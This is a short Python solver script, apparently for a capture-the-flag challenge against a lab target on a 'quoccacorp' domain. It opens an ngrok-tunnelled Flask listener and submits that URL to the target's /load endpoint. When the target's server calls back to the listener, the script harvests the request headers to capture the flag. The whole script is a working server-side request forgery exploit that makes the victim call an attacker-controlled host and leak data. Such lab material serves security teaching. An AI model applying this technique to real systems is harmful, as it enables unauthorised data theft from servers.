import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from flask import Flask, request
from pyngrok import ngrok
import threading

BASE_URL = "https://quocced-in.quoccacorp.com"
LISTEN_PORT = 8000

app = Flask(__name__)

@app.route('/')
def index():
    for header_value in request.headers.values():
        find_flag(header_value)
    return "OK"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.ngrok_public_url = ngrok.connect(LISTEN_PORT, "http").public_url

    def start_server(self):
        threading.Thread(target=lambda: app.run(host="0.0.0.0", port=LISTEN_PORT), daemon=True).start()

    def main(self):
        self.start_server()
        self.session.post(f"{BASE_URL}/load", json={"site": self.ngrok_public_url})

if __name__ == "__main__":
    Solver().main()